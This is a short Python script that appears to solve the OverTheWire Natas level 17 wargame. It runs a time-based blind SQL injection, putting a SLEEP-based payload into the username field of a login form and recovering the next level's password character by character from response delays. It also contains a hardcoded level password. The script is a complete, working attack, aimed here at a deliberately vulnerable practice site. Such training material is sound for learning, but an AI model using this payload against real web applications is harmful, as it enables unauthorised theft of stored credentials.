import requests
import re
from time import *

username = "natas17"
password = "KLdAM3VZux8o6TbkbhuaG5KtYjI77tfx"
url = 'http://%s.natas.labs.overthewire.org/' % username

#session = requests.Session() #Maintains a session
#response = session.get(url, auth=(username, password))

charset="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
extracted_password = ""

print("Starting password scan.")

for position in range(1,33):
    for char in charset:
        start_time = time()
        data = {'username':f'natas18" AND IF(BINARY password LIKE "{extracted_password}{char}%", SLEEP(5), 0) #',"submit":"Check existence"}
        response = requests.post(url, auth = (username,password), data = data)
        end_time = time()
        difference = end_time - start_time
        print(f"Time taken for character {char}: {difference} seconds")
        if difference > 4.0:
            extracted_password += char
            print(f"Password so far: {extracted_password}")
            break

print (f"Final Password: {extracted_password}")
#print(content := response.text)
